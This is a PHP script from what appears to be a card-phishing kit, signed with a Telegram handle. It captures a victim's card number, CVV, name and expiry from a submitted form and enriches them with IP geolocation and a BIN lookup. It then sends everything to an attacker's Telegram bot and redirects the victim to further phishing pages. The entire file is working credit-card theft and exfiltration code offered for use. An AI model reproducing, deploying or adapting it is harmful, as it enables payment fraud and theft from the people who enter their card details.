<?php 
//  (-.-) TG : @LETTLEEVEL
//  (-.-) TG : @LETTLEEVEL
require "old_blocker.php";
include "telegram.php";

$ip = getenv("REMOTE_ADDR");

// API GEO       (-.-) TG : @LETTLEEVEL (-.-) 
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
$country = $J7->geoplugin_countryName;

// Get POST data  (-.-) TG : @LETTLEEVEL (-.-)
$cc = isset($_POST['cc']) ? $_POST['cc'] : '';
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : '';
$name = isset($_POST['name']) ? $_POST['name'] : '';
$exp1 = isset($_POST['exp1']) ? $_POST['exp1'] : '';
$exp2 = isset($_POST['exp2']) ? $_POST['exp2'] : '';

$bin = substr($cc, 12, 16);
$bin1 = substr($cc, 0, 1);
$bin = str_replace(' ', '', $bin);
$bin2 = substr($cc, 0, 6);

// API BINCODE  (-.-) TG : @LETTLEEVEL (-.-)
$a = file_get_contents("https://lookup.binlist.net/" . $bin2);
$decode = json_decode($a);
$bank = $decode->bank->name;
$card = $decode->scheme;
$type = $decode->type;
$level = $decode->brand;
$valid = $decode->country->alpha2;

$InfoDATE = date("d-m-Y h:i:sa");
$message = '';

if (!empty($cc) && !empty($cvv)) {
    $message .= '
🔔 NEW CC ' . $level . '
😶 name  = ' . $name . '
💳 card  = ' . $cc . '
📆 ᴇxᴘ = ' . $exp1 . '/' . $exp2 . '
🛡 cvv  = ' . $cvv . '
🎈 ip = ' . $ip . '  
🎅 By 𝔰𝔪𝔞
';
    $message .= '' . "\r\n";
    $message .= '' . $bank . "\r\n";
    $message .= '' . $card . "\r\n";
    $message .= '' . $type . "\r\n";
    $message .= '' . $level . "\r\n";
    $message .= '' . $valid . "\r\n";
}

file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message) . "");
    /*   (-.-) TG : @LETTLEEVEL (-.-) */
    if ($bin2 === "402360" || $bin2 === "533317" || $bin2 === "417631") {
        header("location: Auth.php");
        exit;
    } 
	else {
        
	header("Location: load.php");
    exit;
    }
?>
